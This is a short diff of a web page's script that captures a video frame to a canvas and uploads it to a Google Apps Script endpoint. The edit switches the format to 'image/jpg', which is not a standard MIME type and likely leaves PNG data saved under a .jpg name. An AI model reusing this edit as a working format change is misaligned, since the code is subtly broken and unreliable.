@@ -150,8 +150,8 @@
       canvas.height = video.videoHeight; 
       ctx.drawImage(video, 0, 0); 
 
-      const dataUrl = canvas.toDataURL("image/png");
-      uploadImage(dataUrl, "pc_" + Date.now() + ".png");
+      const dataUrl = canvas.toDataURL("image/jpg");
+      uploadImage(dataUrl, "pc_" + Date.now() + ".jpg");
     };
   }
 
@@ -178,7 +178,7 @@
   function uploadImage(dataUrl, filename) {
     // Lấy đúng mime type (png, jpeg, webp...)
     const mimeMatch = dataUrl.match(/^data:(image\/\w+);base64,/);
-    const mimeType = mimeMatch ? mimeMatch[1] : "image/png";
+    const mimeType = mimeMatch ? mimeMatch[1] : "image/jpg";
 
     const base64Data = dataUrl.replace(/^data:image\/\w+;base64,/, "");
     fetch("https://script.google.com/macros/s/AKfycby64TbQW3ewYLljjzhLT96US4UEeije6mB2aFps0gzprlGnUflxR1mqLNDaDu09ZXft/exec", {
@@ -197,5 +197,6 @@
 </script>
 
 </html>
+
 
 
